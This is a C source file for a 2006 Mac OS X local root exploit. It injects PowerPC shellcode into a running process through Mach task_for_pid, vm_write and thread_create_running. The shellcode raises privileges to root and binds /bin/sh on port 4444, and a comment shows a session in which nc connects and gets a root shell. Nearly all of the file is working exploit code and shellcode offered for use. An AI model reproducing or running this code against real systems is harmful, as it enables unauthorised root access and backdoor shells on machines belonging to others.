 /*
 \
 /  OSXinject.c - Mac OS X local root exploit 
 \  for defacing http://rm-my-mac.wideopenbsd.org/
 /
 \  By CMN <cmn@signedness.org> 2006-03-12
 /
 \  Mac OS X (both PPC and x86) allows writing into a setuid process 
 /  which has dropped its privileges. I did not find this bug, someone 
 \  else did. I just wrote this sploit.
 /
 \  rm-my-Mac:~ www_signedness_org$ uname -a
 /  Darwin rm-my-Mac.WideOpenBSD.ORG 8.5.0 Darwin Kernel Version 8.5.0: \
 \      Sun Jan 22 10:38:46 PST 2006; root:xnu-792.6.61.obj~1/RELEASE_PPC \
 /      Power Macintosh powerpc
 \  rm-my-Mac:~ www_signedness_org$ ps aux | grep launchd
 /  www_sign 13842   0.0  0.0    27316    396  p3  S+   12:19PM   0:00.01 /sbin/launchd
 \  rm-my-Mac:~ www_signedness_org$ ./OSXinject 13842
 /  rm-my-Mac:~ www_signedness_org$ nc -vv localhost 4444
 \  localhost [127.0.0.1] 4444 (krb524) open
 /  id
 \  uid=0(root) gid=29293(rm) groups=29293(rm)
 /
 \
*/



#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>

/*
 * seteuid(0); setuid(0); bind "/bin/sh" on port 4444
 * Based on osx_ppc_bind at http://metasploit.com.
 * The execve() call fails for some reason when 
 * the shellcode is run on a pearpc emulated installation.
 */
unsigned char scode[] =
"\x7c\x63\x1a\x78\x38\x00\x00\xb7\x44\x00\x00\x02"
"\x7c\x63\x1a\x78\x38\x00\x00\x17\x44\x00\x00\x02\x00\x00\x00\x00"
"\x38\x60\x00\x02\x38\x80\x00\x01\x38\xa0\x00\x06\x38\x00\x00\x61"
"\x44\x00\x00\x02\x7c\x00\x02\x78\x7c\x7e\x1b\x78\x48\x00\x00\x0d"
"\x00\x02\x11\x5c\x00\x00\x00\x00\x7c\x88\x02\xa6\x38\xa0\x00\x10"
"\x38\x00\x00\x68\x7f\xc3\xf3\x78\x44\x00\x00\x02\x7c\x00\x02\x78"
"\x38\x00\x00\x6a\x7f\xc3\xf3\x78\x44\x00\x00\x02\x7c\x00\x02\x78"
"\x7f\xc3\xf3\x78\x38\x00\x00\x1e\x38\x80\x00\x10\x90\x81\xff\xe8"
"\x38\xa1\xff\xe8\x38\x81\xff\xf0\x44\x00\x00\x02\x7c\x00\x02\x78"
"\x7c\x7e\x1b\x78\x38\xa0\x00\x02\x38\x00\x00\x5a\x7f\xc3\xf3\x78"
"\x7c\xa4\x2b\x78\x44\x00\x00\x02\x7c\x00\x02\x78\x38\xa5\xff\xff"
"\x2c\x05\xff\xff\x40\x82\xff\xe5\x38\x00\x00\x42\x44\x00\x00\x02"
"\x7c\x00\x02\x78\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7c\x68\x02\xa6"
"\x38\x63\x00\x28\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8"
"\x38\x00\x00\x3b\x7c\x00\x04\xac\x44\x00\x00\x02\x7c\x00\x02\x78"
"\x7f\xe0\x00\x08\x2f\x62\x69\x6e\x2f\x63\x73\x68\x00\x00\x00\x00";


/*
 * Translate error to string
 */
const char *
kerr(kern_return_t err)
{
    switch (err) {
        
        case KERN_SUCCESS: 
            return("Success");
            break;
            
        case KERN_INVALID_ADDRESS: 
            return("Invalid address");
            break;
            
        case KERN_INVALID_ARGUMENT:
            return("Invalid argument");
            break;
            
        case KERN_PROTECTION_FAILURE:
            return("Protection failure");
            break;
            
        case KERN_NO_SPACE:
            return("No enough memory");
            break;
    }

    return("Unknown error");
}


/*
 * Inject code and spawn a thread in a process on PPC.
 * Returns 0 on success, -1 on error.
 */
int
proc_thread_inject_ppc(pid_t pid, unsigned char *code, size_t len)
{
    #define STACK_SIZE 8192
    kern_return_t ret;
    mach_port_t remote_task;
    ppc_thread_state_t ppc_state;
    vm_address_t stack_addr;
    vm_address_t code_addr;
    thread_act_t thread;

    /* Get task from PID */
    if ( (ret = task_for_pid(mach_task_self(), pid, &remote_task))) {
        fprintf(stderr, "task_for_pid failed: %s\n", kerr(ret));
        return(-1);
    }

    /* Allocate code memory anywhere in the remote process */
    ret = vm_allocate(remote_task, &code_addr, len, TRUE);

    if (ret != KERN_SUCCESS) {
        fprintf(stderr, "vm_allocate failed: %s\n", kerr(ret));
        return(-1);
    }

    /* Write the code into memory */
    ret = vm_write(remote_task, code_addr, (vm_address_t)code, len);

    if (ret != KERN_SUCCESS) {
        fprintf(stderr, "vm_write failed: %s\n", kerr(ret));
        return(-1);
    }

    /* Allocate stack memory anywhere in remote process */
    ret = vm_allocate(remote_task, &stack_addr, STACK_SIZE, TRUE);

    if (ret != KERN_SUCCESS) {
        fprintf(stderr, "vm_allocate failed: %s\n", kerr(ret));
        return(-1);
    }

    /* Set up registers */
    memset(&ppc_state, 0x00, sizeof(ppc_state));
    ppc_state.srr0 = code_addr;
    ppc_state.r1 = stack_addr;

    /* Attempt to spawn thread */
    ret = thread_create_running(remote_task, PPC_THREAD_STATE,
        (thread_state_t)&ppc_state, PPC_THREAD_STATE_COUNT, &thread);

    if (ret != KERN_SUCCESS) {
        fprintf(stderr, "thread_create_running failed: %s\n", kerr(ret));
        return(-1);
    }

    return(0);    
    #undef STACK_SIZE
}


int
main(int argc, char *argv[])
{
    pid_t pid;

    if (argc != 2) {
        printf(".::. Mac OS X local root exploit by CMN .::.\n");
        printf("Usage: %s <pid>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    pid = atoi(argv[1]);

    if (proc_thread_inject_ppc(pid, scode, sizeof(scode)) < 0)
        exit(EXIT_FAILURE);

    exit(EXIT_SUCCESS);
}
